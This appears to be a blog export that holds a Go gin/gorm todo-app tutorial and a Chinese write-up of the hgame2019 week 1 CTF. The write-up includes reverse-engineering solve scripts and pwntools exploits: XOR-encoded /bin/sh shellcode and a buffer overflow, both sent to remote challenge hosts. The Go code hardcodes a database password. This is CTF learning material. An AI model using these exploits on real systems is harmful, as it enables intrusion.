class="string">&#x27;a_count&#x27;</span>):<span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">    getE(<span class="string">&#x27;session_count&#x27;</span>).innerHTML = session_count;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">localStorage</span>.setItem(<span class="string">&#x27;a_count&#x27;</span>,session_count+<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title>bubble_list</title>
    <url>/2020/03/22/bubble-list/</url>
    <content><![CDATA[<p>Q1mi老师的小清单程序的练习和注释</p>
<span id="more"></span>

<p>学习资料：<a href="https://www.liwenzhou.com/posts/Go/go_menu/">https://www.liwenzhou.com/posts/Go/go_menu/</a></p>
<p>前端的事情咱就不管了233，直接把static和template文件夹拷贝下来</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1. create database</span><br><span class="line">2. connect databse   // defer db.Close()</span><br><span class="line">3. AutoMigrate struct table</span><br><span class="line">4. gin static</span><br><span class="line">5. gin templates</span><br><span class="line">6. gin get url</span><br><span class="line">7. operate ORM</span><br><span class="line">8. gin Run</span><br></pre></td></tr></table></figure>

<h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">1. 用POST检测API</span><br><span class="line">2. 绑定参数用params.get</span><br><span class="line">3. 获取信息竟可能绑定成JSON // bindjson</span><br><span class="line">4. 是不是用.error判断数据库的交互是否正确</span><br></pre></td></tr></table></figure>

<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/jinzhu/gorm&quot;</span></span><br><span class="line">	_ <span class="string">&quot;github.com/jinzhu/gorm/dialects/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	db *gorm.DB <span class="comment">// 为了方便调用</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Todo Model</span></span><br><span class="line"><span class="keyword">type</span> Todo <span class="keyword">struct</span> &#123;</span><br><span class="line">	ID     <span class="keyword">int</span>    <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">	Title  <span class="keyword">string</span> <span class="string">`json:&quot;title&quot;`</span></span><br><span class="line">	Status <span class="keyword">bool</span>   <span class="string">`json:&quot;status&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initMysql</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">	db, err = gorm.Open(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;root:xiaoyuyu@/bubble?charset=utf8&amp;parseTime=True&amp;loc=Local&quot;</span>)</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 连接数据库</span></span><br><span class="line">	err := initMysql()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> db.Close()</span><br><span class="line">	<span class="comment">// 模型Model绑定</span></span><br><span class="line">	db.AutoMigrate(&amp;Todo&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	r := gin.Default()</span><br><span class="line">	<span class="comment">// 解析静态文件Static</span></span><br><span class="line">	r.Static(<span class="string">&quot;/static&quot;</span>, <span class="string">&quot;static&quot;</span>)</span><br><span class="line">	<span class="comment">// 解析templates</span></span><br><span class="line">	r.LoadHTMLGlob(<span class="string">&quot;templates/*&quot;</span>)</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.HTML(http.StatusOK, <span class="string">&quot;index.html&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// POST可以检测到增删改查是放在v1路径后</span></span><br><span class="line">	<span class="comment">// v1</span></span><br><span class="line">	v1Group := r.Group(<span class="string">&quot;v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 待办事项</span></span><br><span class="line">		<span class="comment">// 增</span></span><br><span class="line">		v1Group.POST(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="comment">// 从请求中拿出数据</span></span><br><span class="line">			<span class="keyword">var</span> todo Todo</span><br><span class="line">			c.BindJSON(&amp;todo)</span><br><span class="line">			<span class="comment">// 存入数据库</span></span><br><span class="line">			err = db.Create(&amp;todo).Error</span><br><span class="line">			<span class="comment">// 返回响应</span></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, todo)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 删单个待办事项</span></span><br><span class="line">		v1Group.DELETE(<span class="string">&quot;/todo/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			id, ok := c.Params.Get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> !ok &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: <span class="string">&quot;invalid id&quot;</span>,</span><br><span class="line">				&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> err = db.Where(<span class="string">&quot;id=?&quot;</span>, id).Delete(Todo&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					id: <span class="string">&quot;deleted&quot;</span>,</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 改单个待办事项</span></span><br><span class="line">		v1Group.PUT(<span class="string">&quot;/todo/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			id, ok := c.Params.Get(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> !ok &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: <span class="string">&quot;invalid id&quot;</span>,</span><br><span class="line">				&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">var</span> todo Todo</span><br><span class="line">			<span class="comment">// 查询对应字段</span></span><br><span class="line">			<span class="keyword">if</span> err = db.Where(<span class="string">&quot;id=?&quot;</span>, id).First(&amp;todo).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 绑定目前状态</span></span><br><span class="line">			c.BindJSON(&amp;todo)</span><br><span class="line">			<span class="comment">// 修改</span></span><br><span class="line">			<span class="keyword">if</span> err = db.Save(&amp;todo).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, todo)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="comment">// // 查单个待办事项</span></span><br><span class="line">		<span class="comment">// v1Group.GET(&quot;/todo/:id&quot;, func(c *gin.Context) &#123;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 查所有待办事项</span></span><br><span class="line">		v1Group.GET(<span class="string">&quot;/todo&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="comment">// 查询todos表中所有数据</span></span><br><span class="line">			<span class="keyword">var</span> todoList []Todo</span><br><span class="line">			<span class="keyword">if</span> err = db.Find(&amp;todoList).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, gin.H&#123;</span><br><span class="line">					<span class="string">&quot;error&quot;</span>: err.Error(),</span><br><span class="line">				&#125;)</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.JSON(http.StatusOK, todoList)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;:9090&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>GO</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame2019_week1_wp</title>
    <url>/2019/01/30/hgame2019-week1-wp/</url>
    <content><![CDATA[<p>虽然之前听说学校里的这个新人赛性质的ctf比赛，但是从来没参加过<br><br>今年xiaoyuyu提交了vidar的报名表，要在比赛中好好学习<br><br>在此写下week1的WP，写得不好别说我哈</p>
<span id="more"></span>

<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h4 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h4><p>拿来了学会了就是自己的，我百度了一下brainfuck，第一页就有关于brainfuck c++代码的一些解析，美滋滋</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/brain.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O爷爷给的hint，说[+.]是关键</span><br><span class="line">.输出字符</span><br><span class="line">]遇到’\x00’才会break，那么我们就是要让它break出去（猜的）</span><br><span class="line">我们看一下data[0]干了什么，一开始先是ptr+=1，遇到[]循环里面&lt;导致ptr-=1回到data[0]，然后10个减号，那就是data[0]-10*10，之后又是&gt;，变成data[1]得了，循环之后&lt;，变回data[0]，然后+2,最后要等与0</span><br><span class="line">0-2+100=98，chr(98)=b，题目是brain fuck，感觉有点意思</span><br></pre></td></tr></table></figure>

<p>以此类推</p>
<h4 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h4><p>直接ida搜索字符串</p>
<h4 id="わかります"><a href="#わかります" class="headerlink" title="わかります"></a>わかります</h4><p>O爷爷的题目一开始不敢做，结果来了个wakalimasu……</p>
<p>主题就是一个check，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/2-1.png" alt="img"></p>
<p>跟进</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/2-2.png" alt="img"></p>
<p>从下往上捋一遍</p>
<p>dword_602120,dword_6021c0是最终数据</p>
<p>sub_400892操作是一个二维数组赋值，直接当一维也行</p>
<p>另一个函数是三维的，6<em>6</em>6，当一维的也行，一个是乘法运算(怀疑矩阵乘法)，一个是加法运算，当然这只是初步的思考</p>
<p>举证乘法如下(来自百度)：</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/2-3.png" alt="img"></p>
<p>接下来我把三组数据全部在ida里用shift+e分离出来，发现三组数据长度相同，然后刚开头的&gt;&gt;4，和&amp;0xf，算是对一个char单位的高四位和低四位的分离操作，然后对高四位和低四位分别做乘除运算</p>
<p>这里强烈推荐matlab，求矩阵乘除法的神器，也多亏了别人的推荐，还好信号与系统这门课要装matlab</p>
<p>脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = [<span class="number">0x7A</span>, <span class="number">0xCF</span>, <span class="number">0x8C</span>, <span class="number">0x95</span>, <span class="number">0x8E</span>, <span class="number">0xA8</span>, <span class="number">0x5F</span>, <span class="number">0xC9</span>, <span class="number">0x7A</span>, <span class="number">0x91</span>,</span><br><span class="line">     <span class="number">0x88</span>, <span class="number">0xA7</span>, <span class="number">0x70</span>, <span class="number">0xC0</span>, <span class="number">0x7F</span>, <span class="number">0x89</span>, <span class="number">0x86</span>, <span class="number">0x93</span>, <span class="number">0x5F</span>, <span class="number">0xCF</span>,</span><br><span class="line">     <span class="number">0x6E</span>, <span class="number">0x86</span>, <span class="number">0x85</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0xD4</span>, <span class="number">0xA0</span>, <span class="number">0xA2</span>, <span class="number">0x98</span>, <span class="number">0xB3</span>,</span><br><span class="line">     <span class="number">0x79</span>, <span class="number">0xC1</span>, <span class="number">0x7E</span>, <span class="number">0x7E</span>, <span class="number">0x77</span>, <span class="number">0x93</span>]</span><br><span class="line"></span><br><span class="line">y = [<span class="number">0x10</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x06</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0x17</span>, <span class="number">0x05</span>, <span class="number">0x0A</span>,</span><br><span class="line">     <span class="number">0x0C</span>, <span class="number">0x17</span>, <span class="number">0x0E</span>, <span class="number">0x17</span>, <span class="number">0x13</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x0A</span>, <span class="number">0x04</span>, <span class="number">0x0D</span>,</span><br><span class="line">     <span class="number">0x16</span>, <span class="number">0x11</span>, <span class="number">0x0B</span>, <span class="number">0x16</span>, <span class="number">0x06</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x0B</span>, <span class="number">0x12</span>, <span class="number">0x09</span>,</span><br><span class="line">     <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x0D</span>]</span><br><span class="line"></span><br><span class="line">a2 = [<span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x01</span>, <span class="number">0x02</span>,</span><br><span class="line">      <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0x03</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x06</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x03</span>, <span class="number">0x05</span>,</span><br><span class="line">      <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>,</span><br><span class="line">      <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">input_s = []</span><br><span class="line">low = []     <span class="comment"># 低位</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">high = [<span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">6</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">7</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>]    <span class="comment"># 高位</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y)):             <span class="comment"># y a2是三组数据中的两组</span></span><br><span class="line">    low.append(<span class="built_in">hex</span>(y[i]-a2[i]))</span><br><span class="line">    input_s.append(<span class="built_in">int</span>((<span class="built_in">str</span>(high[i])+low[i]).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>),<span class="number">16</span>))</span><br><span class="line">    flag += <span class="built_in">chr</span>(input_s[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(low)</span><br><span class="line"><span class="built_in">print</span>(input_s)</span><br><span class="line"><span class="built_in">print</span>(flag)    <span class="comment"># hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h4><p>这题我被秀傻了，写脚本怎么看都奇怪，后来直接去gdb里面找判断语句，Gdb直接打断点，surprise!!!</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/3-1.png" alt="img"></p>
<p>然后错了……假flag……</p>
<p>目测ida里的数据的顺序是错的，或者有缺漏的可能性也很高</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/3-2.png" alt="img"></p>
<p>直接去gdb里面找</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/3-3.png" alt="img"></p>
<p>把数据拉出来跑一下就好</p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=[<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x0</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0x5c</span>,<span class="number">0x12</span>,<span class="number">0x26</span>,<span class="number">0x0b</span>,</span><br><span class="line">    <span class="number">0x5d</span>,<span class="number">0x2b</span>,<span class="number">0x0b</span>,<span class="number">0x17</span>,<span class="number">0x00</span>,<span class="number">0x17</span>,<span class="number">0x2b</span>,<span class="number">0x45</span>,<span class="number">0x06</span>,<span class="number">0x56</span>,<span class="number">0x2c</span>,<span class="number">0x36</span>,<span class="number">0x43</span>,<span class="number">0x00</span>,<span class="number">0x42</span>,</span><br><span class="line">    <span class="number">0x55</span>,<span class="number">0x7e</span>,<span class="number">0x48</span>,<span class="number">0x55</span>,<span class="number">0x1e</span>,<span class="number">0x00</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">key=<span class="string">&#x27;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">n=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(s[n]^<span class="built_in">ord</span>(i))</span><br><span class="line">    n+=<span class="number">1</span></span><br><span class="line">    <span class="comment"># flag+=chr(s[i]^key[len(key)-i-1]%255)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h4 id="Pro的Python教室-一"><a href="#Pro的Python教室-一" class="headerlink" title="Pro的Python教室(一)"></a>Pro的Python教室(一)</h4><p>直接写脚本，异或运算，或者在线b64decode一下就好</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="babysc"><a href="#babysc" class="headerlink" title="babysc"></a>babysc</h4><p>难点其实是不能f5，虽然直接看汇编大概可以看出来</p>
<p>把call rdx nop掉就可以f5了</p>
<p>就是把shellcode在运行前要进行xor(i+1)的操作</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;./babysc&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./babysc&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./babysc&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">shellcode=[<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xff</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0xb0</span>,<span class="number">0x69</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>,<span class="number">0x48</span>,<span class="number">0x31</span></span><br><span class="line">,<span class="number">0xd2</span>,<span class="number">0x48</span>,<span class="number">0xbb</span>,<span class="number">0xff</span>,<span class="number">0x2f</span>,<span class="number">0x62</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x2f</span>,<span class="number">0x73</span>,<span class="number">0x68</span>,<span class="number">0x48</span>,<span class="number">0xc1</span>,<span class="number">0xeb</span></span><br><span class="line">,<span class="number">0x08</span>,<span class="number">0x53</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x50</span>,<span class="number">0x57</span>,<span class="number">0x48</span></span><br><span class="line">,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0xb0</span>,<span class="number">0x3b</span>,<span class="number">0x0f</span>,<span class="number">0x05</span>]</span><br><span class="line">payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">    payload+=<span class="built_in">chr</span>(shellcode[i]^(i+<span class="number">1</span>))</span><br><span class="line">cn.sendline(payload)</span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="aaaaaaaaaa"><a href="#aaaaaaaaaa" class="headerlink" title="aaaaaaaaaa"></a>aaaaaaaaaa</h4><p>输入一大堆a就好了，偏移量大概就是(0x40-0x10)，有点忘记了……</p>
<p>偏移量可以直接从ida里面看出来</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = process(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">	libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;118.24.3.214&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;world!let us aaaaaaaaaa!!!&#x27;</span>)</span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="薯片拯救世界1"><a href="#薯片拯救世界1" class="headerlink" title="薯片拯救世界1"></a>薯片拯救世界1</h4><p>先a一下字符串翻译一下</p>
<p>a完之后，string里可以找到如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-1-1.png" alt="img"></p>
<p>Emmmmm……(看都不看，就觉得是aris出的题)</p>
<p>靠flag定位，如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-1-2.png" alt="img"></p>
<p>目的应该是读取这个flag文件，大概流程如下</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-1-3.png" alt="img"></p>
<p>但是感觉true不true也对读取flag关系，我们输入正确的flag就会true，这题不是提权，s1是我们fread flag中用于接收数据的内存地址</p>
<p><img src="https://github.com/woaixiaoyuyu/MarkdownPhotos/raw/master/hgame2019_week1/pwn-1-4.png" alt="img"></p>
<p>Canary开启了，要溢出的话要绕过了，或者说泄露canary，然后利用，有while的话利用泄露出来的canary不是不可能的</p>
<p>本地测试的时候要建一个flag.txt，不然程序运行不起来</p>
<p>感觉像是fork，试试看爆破canary，然后爆破失败，问出题人是不是这个思路，aris说第一周出这个他是魔鬼么？(虽然我觉得是，orz)</p>
<p>换思路换思路</p>
<p>现在想的是，有个while，不断往buf可以填入0x18字节，迟早会溢出的，很棒，算一下可利用空间，0x18+0x18-0x24=12，应该是够改eip了，试试看，gg read读的地址都是buf，会刷新，这可咋整啊</p>
<p>师傅给的hint最终是让我们爆破flag，秒懂</p>
<p>但是过程中遇到了一切困难，我nc过去输入一个h都是错的，然后我gdb调试发现，输入hgame，字符串长度竟然是13，而且只要答对一次，程序就结束了，理论上exp要跑很多遍才行，当然啦主要是我写的exp垃圾，不然一次就好</p>
<p>exp：</p>
